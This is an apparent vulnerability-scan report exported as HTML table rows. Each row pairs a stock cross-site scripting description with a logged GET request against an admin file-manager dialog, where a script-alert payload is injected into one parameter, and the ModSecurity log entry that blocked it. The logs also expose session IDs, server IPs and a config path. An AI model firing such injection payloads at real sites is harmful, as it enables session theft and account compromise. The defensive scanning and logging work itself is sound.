>8366862</td><td class=xl24 width=64 >2015-03-31 20:57:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(309899)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28309899%29%2F; PHPSESSID=r3r0grc8hffdeo46984bq72n03
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:21</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:19 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(309899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts26wQAW0AAHchlVUAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts26wQAW0AAHchlVUAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366863</td><td class=xl24 width=64 >2015-03-31 20:59:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(305599)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=v61noagpglin0jq5ju98q6u5u0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:22</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:21 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(305599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts3awQAW0AAHgzv0cAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts3awQAW0AAHgzv0cAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366864</td><td class=xl24 width=64 >2015-03-31 21:01:31</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=&lt;script&gt;prompt(452299)&lt;/script/&gt;&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=35vkpnl448udgihrvo9b5m4a85
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:23</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:22 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(452299)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts3qwQAW0AAB7zKNQAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts3qwQAW0AAB7zKNQAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366866</td><td class=xl24 width=64 >2015-03-31 21:03:15</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(269099)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=9stc3qmnfj969ghslmi48rekv0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:24</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:23 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(269099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts36wQAW0AAHhGMt0AAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts36wQAW0AAHhGMt0AAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366867</td><td class=xl24 width=64 >2015-03-31 21:04:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(817299)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=rn1spbluesk9ki28chdsq34oa2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:26</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:25 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(817299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts4awQAW0AAHzDqsMAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts4awQAW0AAHzDqsMAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366868</td><td class=xl24 width=64 >2015-03-31 21:06:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(236299)&lt;/script&gt;&lt;!--&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28236299%29%2F; PHPSESSID=3r1s9vvncqrldcq4cvmohd4i80
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:27</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:26 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(236299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts4qwQAW0AAHewA9MAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts4qwQAW0AAHewA9MAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366870</td><td class=xl24 width=64 >2015-03-31 21:08:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(978399)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=oqi3o4papqqu7pddcn8dnuscq0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:28</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:27 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(978399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts46wQAW0AABvT@G8AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts46wQAW0AABvT@G8AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366871</td><td class=xl24 width=64 >2015-03-31 21:11:53</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


